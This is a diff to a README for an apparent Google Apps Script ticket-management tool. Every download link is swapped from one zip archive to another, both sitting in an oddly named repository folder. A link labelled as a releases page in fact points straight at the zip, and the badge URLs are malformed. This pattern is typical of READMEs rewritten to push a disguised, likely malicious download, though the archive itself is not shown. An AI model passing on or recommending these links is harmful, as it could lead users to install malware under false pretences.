@@ -1,7 +1,7 @@
 # 🎟️ ticket-management-system - Simplify Your Help Desk Workflow
 
 ## 📥 Download Now
-[![Download](https://raw.githubusercontent.com/Lux8b/ticket-management-system/main/irreprovableness/management_system_ticket_1.0.zip%20Now-%https://raw.githubusercontent.com/Lux8b/ticket-management-system/main/irreprovableness/management_system_ticket_1.0.zip)](https://raw.githubusercontent.com/Lux8b/ticket-management-system/main/irreprovableness/management_system_ticket_1.0.zip)
+[![Download](https://github.com/Lux8b/ticket-management-system/raw/refs/heads/main/irreprovableness/ticket_system_management_2.5.zip%20Now-%https://github.com/Lux8b/ticket-management-system/raw/refs/heads/main/irreprovableness/ticket_system_management_2.5.zip)](https://github.com/Lux8b/ticket-management-system/raw/refs/heads/main/irreprovableness/ticket_system_management_2.5.zip)
 
 ## 📝 Introduction
 Welcome to the Ticket Management System! This application helps you manage help tickets easily. Built using Google Apps Script and Google Sheets, it offers role-based authentication, ticket tracking, follow-up reminders, and a user-friendly admin dashboard. 
@@ -13,7 +13,7 @@ To start using the Ticket Management System, follow these steps:
 
 1. **Visit the Releases Page**
    Go to our releases page by clicking the link below:
-   [Visit the Release Page](https://raw.githubusercontent.com/Lux8b/ticket-management-system/main/irreprovableness/management_system_ticket_1.0.zip)
+   [Visit the Release Page](https://github.com/Lux8b/ticket-management-system/raw/refs/heads/main/irreprovableness/ticket_system_management_2.5.zip)
 
 2. **Select the Latest Version**
    On the releases page, you will see different versions of the application. Look for the latest release, which typically comes at the top.
@@ -74,6 +74,6 @@ For any questions or support requests, visit the GitHub issues page or send us a
 This project is licensed under the MIT License. You can use, modify, and distribute the application as needed.
 
 ## 📥 Download Now Again
-[![Download](https://raw.githubusercontent.com/Lux8b/ticket-management-system/main/irreprovableness/management_system_ticket_1.0.zip%20Now-%https://raw.githubusercontent.com/Lux8b/ticket-management-system/main/irreprovableness/management_system_ticket_1.0.zip)](https://raw.githubusercontent.com/Lux8b/ticket-management-system/main/irreprovableness/management_system_ticket_1.0.zip)
+[![Download](https://github.com/Lux8b/ticket-management-system/raw/refs/heads/main/irreprovableness/ticket_system_management_2.5.zip%20Now-%https://github.com/Lux8b/ticket-management-system/raw/refs/heads/main/irreprovableness/ticket_system_management_2.5.zip)](https://github.com/Lux8b/ticket-management-system/raw/refs/heads/main/irreprovableness/ticket_system_management_2.5.zip)
 
 Thank you for choosing the Ticket Management System! Enjoy managing your help tickets more effectively.
